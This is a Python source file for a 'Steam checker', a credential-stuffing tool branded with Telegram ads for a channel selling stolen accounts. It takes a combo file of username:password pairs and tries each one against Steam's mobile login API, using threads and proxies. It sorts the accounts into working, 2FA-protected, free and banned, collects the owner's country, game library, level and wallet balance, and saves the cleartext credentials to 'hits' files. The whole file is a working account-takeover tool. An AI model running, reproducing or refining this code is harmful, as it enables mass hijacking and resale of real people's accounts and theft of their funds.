# language: Python 3.10+, file: steam.py
# Steam checker — extracted from remo.py
# CLI: python steam.py
# Import: from steam import check_steam

import os, sys, re, json, time, base64, struct, random, threading
from pathlib import Path
from datetime import datetime
from urllib.parse import quote as url_quote
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3
urllib3.disable_warnings()

ADS_HEADER = """Shiver Me Timbers 🏴‍☠️
🔥🔥🔥JOIN FOR DAILY PREMIUM DROPS 🔥🔥
🎮XBOX ACCOUNTS 🎮
📲STREAMING ACCOUNTS 📲
🎰GOOD QUALITY HOTMAILS 🎰
💥METHODS 💥
⚡AND MANY MORE PREMIUMS DROPS ⚡

Owner :- @Remo_god7

Group Chat :- @JoinPiratesCloudChat

🚨The content shared in this channel is for educational purpose only !!
https://t.me/JoinThePiratesCloud

────────────────────────────────────────────────────────
"""

MY_SIGNATURE = "@Remo_god7"

STEAM_BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
STEAM_CT = f"multipart/form-data; boundary={STEAM_BOUNDARY}"
STEAM_UA = "okhttp/4.9.2"
STEAM_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "User-Agent": STEAM_UA,
}
STEAM_COUNTRY_MAP = {
    "AF":"Afghanistan","AX":"Aland Islands","AL":"Albania","DZ":"Algeria","AS":"American Samoa",
    "AD":"Andorra","AO":"Angola","AI":"Anguilla","AG":"Antigua and Barbuda","AR":"Argentina",
    "AM":"Armenia","AW":"Aruba","AU":"Australia","AT":"Austria","AZ":"Azerbaijan","BS":"Bahamas",
    "BH":"Bahrain","BD":"Bangladesh","BB":"Barbados","BY":"Belarus","BE":"Belgium","BZ":"Belize",
    "BJ":"Benin","BM":"Bermuda","BT":"Bhutan","BO":"Bolivia","BA":"Bosnia and Herzegovina",
    "BW":"Botswana","BR":"Brazil","BN":"Brunei","BG":"Bulgaria","BF":"Burkina Faso","BI":"Burundi",
    "KH":"Cambodia","CM":"Cameroon","CA":"Canada","CV":"Cape Verde","KY":"Cayman Islands",
    "CF":"Central African Republic","TD":"Chad","CL":"Chile","CN":"China","CO":"Colombia",
    "KM":"Comoros","CG":"Congo","CD":"DR Congo","CK":"Cook Islands","CR":"Costa Rica",
    "CI":"Cote d'Ivoire","HR":"Croatia","CU":"Cuba","CW":"Curacao","CY":"Cyprus",
    "CZ":"Czech Republic","DK":"Denmark","DJ":"Djibouti","DM":"Dominica","DO":"Dominican Republic",
    "EC":"Ecuador","EG":"Egypt","SV":"El Salvador","GQ":"Equatorial Guinea","ER":"Eritrea",
    "EE":"Estonia","ET":"Ethiopia","FK":"Falkland Islands","FO":"Faroe Islands","FJ":"Fiji",
    "FI":"Finland","FR":"France","GF":"French Guiana","PF":"French Polynesia","GA":"Gabon",
    "GM":"Gambia","GE":"Georgia","DE":"Germany","GH":"Ghana","GI":"Gibraltar","GR":"Greece",
    "GL":"Greenland","GD":"Grenada","GP":"Guadeloupe","GU":"Guam","GT":"Guatemala","GG":"Guernsey",
    "GN":"Guinea","GW":"Guinea-Bissau","GY":"Guyana","HT":"Haiti","VA":"Vatican","HN":"Honduras",
    "HK":"Hong Kong","HU":"Hungary","IS":"Iceland","IN":"India","ID":"Indonesia","IR":"Iran",
    "IQ":"Iraq","IE":"Ireland","IM":"Isle of Man","IL":"Israel","IT":"Italy","JM":"Jamaica",
    "JP":"Japan","JE":"Jersey","JO":"Jordan","KZ":"Kazakhstan","KE":"Kenya","KI":"Kiribati",
    "KP":"North Korea","KR":"South Korea","KW":"Kuwait","KG":"Kyrgyzstan","LA":"Laos","LV":"Latvia",
    "LB":"Lebanon","LS":"Lesotho","LR":"Liberia","LY":"Libya","LI":"Liechtenstein","LT":"Lithuania",
    "LU":"Luxembourg","MO":"Macao","MK":"North Macedonia","MG":"Madagascar","MW":"Malawi",
    "MY":"Malaysia","MV":"Maldives","ML":"Mali","MT":"Malta","MH":"Marshall Islands","MQ":"Martinique",
    "MR":"Mauritania","MU":"Mauritius","YT":"Mayotte","MX":"Mexico","FM":"Micronesia","MD":"Moldova",
    "MC":"Monaco","MN":"Mongolia","ME":"Montenegro","MS":"Montserrat","MA":"Morocco","MZ":"Mozambique",
    "MM":"Myanmar","NA":"Namibia","NR":"Nauru","NP":"Nepal","NL":"Netherlands","NC":"New Caledonia",
    "NZ":"New Zealand","NI":"Nicaragua","NE":"Niger","NG":"Nigeria","NU":"Niue","NF":"Norfolk Island",
    "MP":"N. Mariana Islands","NO":"Norway","OM":"Oman","PK":"Pakistan","PW":"Palau","PS":"Palestine",
    "PA":"Panama","PG":"Papua New Guinea","PY":"Paraguay","PE":"Peru","PH":"Philippines","PL":"Poland",
    "PT":"Portugal","PR":"Puerto Rico","QA":"Qatar","RE":"Reunion","RO":"Romania","RU":"Russia",
    "RW":"Rwanda","SA":"Saudi Arabia","SN":"Senegal","RS":"Serbia","SC":"Seychelles","SL":"Sierra Leone",
    "SG":"Singapore","SX":"Sint Maarten","SK":"Slovakia","SI":"Slovenia","SB":"Solomon Islands",
    "SO":"Somalia","ZA":"South Africa","SS":"South Sudan","ES":"Spain","LK":"Sri Lanka","SD":"Sudan",
    "SR":"Suriname","SZ":"Eswatini","SE":"Sweden","CH":"Switzerland","SY":"Syria","TW":"Taiwan",
    "TJ":"Tajikistan","TZ":"Tanzania","TH":"Thailand","TL":"Timor-Leste","TG":"Togo","TO":"Tonga",
    "TT":"Trinidad and Tobago","TN":"Tunisia","TR":"Turkey","TM":"Turkmenistan","TC":"Turks and Caicos",
    "TV":"Tuvalu","UG":"Uganda","UA":"Ukraine","AE":"UAE","GB":"United Kingdom","US":"United States",
    "UY":"Uruguay","UZ":"Uzbekistan","VU":"Vanuatu","VE":"Venezuela","VN":"Vietnam",
    "VG":"British Virgin Islands","VI":"US Virgin Islands","WF":"Wallis and Futuna","EH":"Western Sahara",
    "YE":"Yemen","ZM":"Zambia","ZW":"Zimbabwe",
}


# ══════════════════════════════════════════════════════════════════════════
# PROTOBUF HELPERS
# ══════════════════════════════════════════════════════════════════════════
def _varint(v):
    if v < 0: v &= 0xffffffffffffffff
    buf = bytearray()
    while v > 0x7f:
        buf.append(0x80 | (v & 0x7f)); v >>= 7
    buf.append(v & 0x7f)
    return bytes(buf)

def _read_varint(b, pos):
    r = s = 0
    while pos < len(b):
        x = b[pos]; pos += 1
        r |= (x & 0x7f) << s
        if not (x & 0x80): break
        s += 7
    return r, pos

def _pstr(fn, s):
    d = s.encode() if isinstance(s, str) else s
    return _varint((fn << 3) | 2) + _varint(len(d)) + d

def _pbytes(fn, d):
    return _varint((fn << 3) | 2) + _varint(len(d)) + d

def _pint(fn, v):
    return _varint(fn << 3) + _varint(v if v >= 0 else v & 0xffffffffffffffff)

def _parse_proto(raw):
    out = {}; p = 0
    while p < len(raw):
        try: tag, p = _read_varint(raw, p)
        except Exception: break
        fn = tag >> 3; wt = tag & 7
        if fn < 1: break
        if wt == 0:
            val, p = _read_varint(raw, p)
            prev = out.get(fn)
            out[fn] = [prev, val] if (prev is not None and not isinstance(prev, list)) else (prev + [val] if isinstance(prev, list) else val)
        elif wt == 2:
            ln, p = _read_varint(raw, p)
            if p + ln > len(raw): break
            chunk = raw[p:p + ln]; p += ln
            prev = out.get(fn)
            out[fn] = [prev, chunk] if (prev is not None and not isinstance(prev, list)) else (prev + [chunk] if isinstance(prev, list) else chunk)
        elif wt == 5:
            if p + 4 > len(raw): break
            out[fn] = struct.unpack_from('<I', raw, p)[0]; p += 4
        elif wt == 1:
            if p + 8 > len(raw): break
            out[fn] = struct.unpack_from('<Q', raw, p)[0]; p += 8
        else:
            break
    return out

def _rsa_encrypt(password, mod_hex, exp_hex):
    mod_bytes = bytes.fromhex(mod_hex)
    n = int.from_bytes(mod_bytes, 'big')
    e = int(exp_hex, 16)
    pw = password.encode()
    k = len(mod_bytes)
    fill = k - len(pw) - 3
    pad = bytes(random.randint(1, 255) for _ in range(fill))
    block = b'\x00\x02' + pad + b'\x00' + pw
    m = int.from_bytes(block, 'big')
    c = pow(m, e, n)
    return base64.b64encode(c.to_bytes(k, 'big')).decode()

def _multipart(key, val):
    return (
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
        f"Content-Disposition: form-data; name=\"{key}\"\r\n\r\n"
        f"{val}\r\n"
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
    ).encode()


# ══════════════════════════════════════════════════════════════════════════
# PUBLIC API
# ══════════════════════════════════════════════════════════════════════════
def check_steam(username: str, password: str, proxy: str = None) -> dict:
    result = {"success": False, "type": "bad", "email": username, "password": password,
              "steam_id": "", "country": "", "cc": "", "level": "",
              "games": 0, "balance": "", "game_list": [], "error": None}
    session = None
    try:
        session = requests.Session()
        session.headers.update(STEAM_HEADERS)
        session.headers["Cookie"] = "Steam_Language=english"
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        proto = _pstr(1, username)
        enc = url_quote(base64.b64encode(proto).decode())
        r = session.get(
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=SteamMobile&input_protobuf_encoded={enc}", timeout=15)
        if r.status_code != 200:
            result["type"] = "error"; result["error"] = f"rsa:{r.status_code}"; return result

        rsa = _parse_proto(r.content)
        mod = rsa.get(1, b""); exp = rsa.get(2, b""); ts = rsa.get(3, 0)
        if isinstance(mod, bytes): mod = mod.decode()
        if isinstance(exp, bytes): exp = exp.decode()
        if not mod or not exp:
            result["type"] = "error"; result["error"] = "RSA key empty"; return result

        enc_pw = _rsa_encrypt(password, mod, exp)
        dev = _pstr(1, "SM-S256B") + _pint(2, 3) + _pint(3, -500) + _pint(4, 1)
        auth = (_pstr(2, username) + _pstr(3, enc_pw) + _pint(4, ts) + _pint(5, 1) +
                _pint(7, 1) + _pstr(8, "Mobile") + _pbytes(9, dev) + _pint(11, 0))
        b64 = base64.b64encode(auth).decode()

        r = session.post(
            "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
            data=_multipart("input_protobuf_encoded", b64),
            headers={"Content-Type": STEAM_CT}, timeout=15)

        try: er = int(r.headers.get("X-eresult", "0"))
        except Exception: er = 0

        if er in (5, 2):
            result["type"] = "bad"; result["error"] = "Invalid credentials"; return result
        if er in (63, 43):
            result["type"] = "steam_ban"; result["error"] = "Banned"; return result
        if er != 1:
            result["type"] = "error"; result["error"] = f"eresult={er}"; return result

        ar = _parse_proto(r.content)
        cid = ar.get(1, 0); rid = ar.get(2, b""); sid = ar.get(5, 0)
        confs = ar.get(4, [])
        if isinstance(confs, bytes): confs = [confs]
        elif not isinstance(confs, list): confs = []
        ctypes = []
        for cf in confs:
            if isinstance(cf, bytes):
                parsed = _parse_proto(cf)
                ct = parsed.get(1, 0)
                if isinstance(ct, list): ctypes.extend(ct)
                else: ctypes.append(ct)
        has_2fa = any(t in (2, 3, 4, 5, 6) for t in ctypes)
        if has_2fa:
            result["success"] = True; result["type"] = "steam_2fa"
            result["steam_id"] = str(sid); result["error"] = f"2FA types: {','.join(str(t) for t in ctypes)}"
            return result

        poll = _pint(1, cid) + _pbytes(2, rid)
        r = session.post(
            "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
            data=_multipart("input_protobuf_encoded", base64.b64encode(poll).decode()),
            headers={"Content-Type": STEAM_CT, "Accept-Encoding": "identity"}, timeout=15)
        pr = _parse_proto(r.content)
        tk = pr.get(4, b"")
        if isinstance(tk, bytes): tk = tk.decode("utf-8", errors="ignore")
        if not tk:
            result["type"] = "error"; result["error"] = "No token in poll"; return result

        parts = tk.split(".")
        if len(parts) < 2:
            result["type"] = "error"; result["error"] = "Bad JWT"; return result
        payload = parts[1]; rem = len(payload) % 4
        if rem: payload += "=" * (4 - rem)
        try: jwt = json.loads(base64.urlsafe_b64decode(payload))
        except Exception: jwt = {}
        steamid = str(jwt.get("sub", sid))
        sid_int = int(steamid)
        ck = (f"Steam_Language=english; "
              f"steamLoginSecure={steamid}%7C%7C{url_quote(tk)}; "
              f"mobileClient=android; mobileClientVersion=777777 3.10.9")

        result["steam_id"] = steamid; result["success"] = True; result["type"] = "steam_hit"

        try:
            cpb = struct.pack('<BQ', 0x09, sid_int)
            r = session.post(
                "https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
                f"?access_token={tk}&spoof_steamid=",
                data=_multipart("input_protobuf_encoded", base64.b64encode(cpb).decode()),
                headers={"Content-Type": STEAM_CT}, timeout=10)
            cr = _parse_proto(r.content)
            cc = cr.get(1, b"")
            if isinstance(cc, bytes): cc = cc.decode()
            result["cc"] = cc
            result["country"] = STEAM_COUNTRY_MAP.get(cc, cc)
        except Exception: pass

        try:
            gpb = (_pint(1, sid_int) + _pint(2, 1) + _pint(3, 1) +
                   _pint(6, 0) + _pstr(7, "english") + _pint(8, 1))
            gb64 = url_quote(base64.b64encode(gpb).decode())
            session.headers["Cookie"] = ck
            r = session.get(
                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                f"?access_token={tk}&spoof_steamid=&origin=SteamMobile"
                f"&input_protobuf_encoded={gb64}", timeout=10)
            gr = _parse_proto(r.content)
            result["games"] = gr.get(1, 0)
            rawg = gr.get(2, [])
            if isinstance(rawg, bytes): rawg = [rawg]
            elif not isinstance(rawg, list): rawg = []
            gnames = []
            for g in rawg:
                try:
                    if not isinstance(g, bytes): continue
                    gf = _parse_proto(g)
                    nm = gf.get(2, b"")
                    if isinstance(nm, bytes): nm = nm.decode(errors="replace")
                    if isinstance(nm, str) and nm.strip(): gnames.append(nm.strip())
                except Exception: continue
            result["game_list"] = gnames
        except Exception: pass

        try:
            mpid = sid_int - 76561197960265728
            session.headers["Cookie"] = ck
            r = session.get(f"https://steamcommunity.com/miniprofile/{mpid}/json", timeout=10)
            try:
                mpj = r.json()
                lv = mpj.get("level", mpj.get("player_level", ""))
                result["level"] = str(lv) if lv != "" else ""
            except Exception:
                m = re.search(r'friendPlayerLevel\s+(\S+)', r.text)
                if m: result["level"] = m.group(1)
        except Exception: pass

        try:
            r = session.post(
                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                f"?access_token={tk}&spoof_steamid=",
                data=_multipart("input_protobuf_encoded", "GAE="),
                headers={"Content-Type": STEAM_CT}, timeout=10)
            wr = _parse_proto(r.content)
            bal = wr.get(14, b"")
            if isinstance(bal, bytes): bal = bal.decode("utf-8", errors="ignore")
            elif isinstance(bal, int): bal = str(bal)
            result["balance"] = bal
        except Exception: pass

        if result["games"] == 0 and not result["game_list"]:
            result["type"] = "steam_free"

        return result

    except requests.exceptions.ProxyError:
        result["type"] = "error"; result["error"] = "proxy dead"; return result
    except requests.exceptions.Timeout:
        result["type"] = "error"; result["error"] = "timeout"; return result
    except requests.exceptions.ConnectionError:
        result["type"] = "error"; result["error"] = "conn failed"; return result
    except Exception as e:
        result["type"] = "error"; result["error"] = str(e)[:100]; return result
    finally:
        try:
            if session: session.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════
class _C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[96m"
    BR="\033[1;92m"; BB="\033[1;94m"; BY="\033[1;93m"; E="\033[0m"

def _save(category: str, hits: list[dict]):
    if not hits: return None
    folder = "Results/Steam"
    Path(folder).mkdir(parents=True, exist_ok=True)
    p = Path(folder) / f"{category}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(p, "w", encoding="utf-8") as f:
        f.write(ADS_HEADER)
        f.write(f"# {category.upper()} — {len(hits)} hits\n")
        f.write(f"# Generated: {datetime.now()}\n")
        f.write(f"# Checked by: {MY_SIGNATURE}\n")
        f.write("=" * 60 + "\n\n")
        for i, h in enumerate(hits, 1):
            f.write(f"#{i}\n")
            f.write(f"Username      : {h['email']}\n")
            f.write(f"Password      : {h['password']}\n")
            f.write(f"SteamID       : {h.get('steam_id', '?')}\n")
            f.write(f"Level         : {h.get('level') or '?'}\n")
            f.write(f"Games         : {h.get('games', 0)}\n")
            f.write(f"Wallet        : {h.get('balance') or 'N/A'}\n")
            f.write(f"Country       : {h.get('country') or h.get('cc', '?')}\n")
            if h.get("game_list"):
                f.write("Game List:\n")
                for g in h["game_list"]:
                    f.write(f"  - {g}\n")
            f.write(f"Captured By   : {MY_SIGNATURE}\n")
            f.write("-" * 60 + "\n\n")
    return p


def _main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{_C.B}╔════════════════════════════════════════════════════╗")
    print(f"║                STEAM CHECKER                       ║")
    print(f"╚════════════════════════════════════════════════════╝{_C.E}")
    combo_file = input(f"\n{_C.BY}Combo file:{_C.E} ").strip()
    if not os.path.exists(combo_file):
        print(f"{_C.R}✗ File not found{_C.E}"); return
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if l.strip() and ":" in l]
    if not combos:
        print(f"{_C.R}✗ No valid combos{_C.E}"); return
    try:
        threads = int(input(f"{_C.BY}Threads (1-10) [5]:{_C.E} ").strip() or "5")
    except Exception:
        threads = 5
    threads = max(1, min(10, threads))
    proxy = input(f"{_C.BY}Proxy (optional, ip:port):{_C.E} ").strip() or None

    lock = threading.Lock()
    stats = {"total": len(combos), "done": 0, "hits": 0, "free": 0, "2fa": 0, "bad": 0, "ban": 0, "err": 0}
    buckets = {"steam": [], "steam_2fa": [], "steam_free": [], "steam_ban": []}
    start = time.time()

    def _work(line):
        try:
            user, password = line.split(":", 1)
        except ValueError:
            return
        r = check_steam(user.strip(), password.strip(), proxy=proxy)
        with lock:
            stats["done"] += 1
            t = r.get("type", "error")
            if t == "steam_hit":
                stats["hits"] += 1; buckets["steam"].append(r)
                print(f"\n{_C.BR}✓ {user}{_C.E}  ID:{r.get('steam_id','?')}  "
                      f"Games:{r.get('games',0)}  {r.get('country') or ''}")
            elif t == "steam_free":
                stats["free"] += 1; buckets["steam_free"].append(r)
                print(f"\n{_C.B}🆓 {user}{_C.E}  ID:{r.get('steam_id','?')}")
            elif t == "steam_2fa":
                stats["2fa"] += 1; buckets["steam_2fa"].append(r)
                print(f"\n{_C.BY}🔐 {user}{_C.E}")
            elif t == "steam_ban":
                stats["ban"] += 1; buckets["steam_ban"].append(r)
                print(f"\n{_C.R}🚫 {user}{_C.E}")
            elif t == "bad":
                stats["bad"] += 1
            else:
                stats["err"] += 1
            elapsed = time.time() - start
            cpm = (stats["done"] / elapsed * 60) if elapsed > 0 else 0
            pct = stats["done"] / stats["total"] * 100
            filled = int(30 * pct / 100)
            bar = "█" * filled + "░" * (30 - filled)
            sys.stdout.write(
                f"\r{_C.B}[{bar}] {pct:5.1f}%{_C.E}  "
                f"{_C.BR}H:{stats['hits']}{_C.E} "
                f"🆓:{stats['free']} "
                f"{_C.BY}2FA:{stats['2fa']}{_C.E} "
                f"{_C.R}B:{stats['bad']}{_C.E}  "
                f"{stats['done']}/{stats['total']}  ({cpm:.0f} CPM)"
            )
            sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(_work, combos)

    print(f"\n\n{_C.B}{'='*60}{_C.E}")
    for cat, hits in buckets.items():
        if not hits: continue
        p = _save(cat, hits)
        if p:
            print(f"{_C.BR}{cat:14}{_C.E}  {len(hits):4} hits  →  {p}")
    print(f"{_C.B}{'='*60}{_C.E}")
    print(f"  Hits: {stats['hits']}  Free: {stats['free']}  2FA: {stats['2fa']}  "
          f"Ban: {stats['ban']}  Bad: {stats['bad']}  Errors: {stats['err']}")


if __name__ == "__main__":
    _main()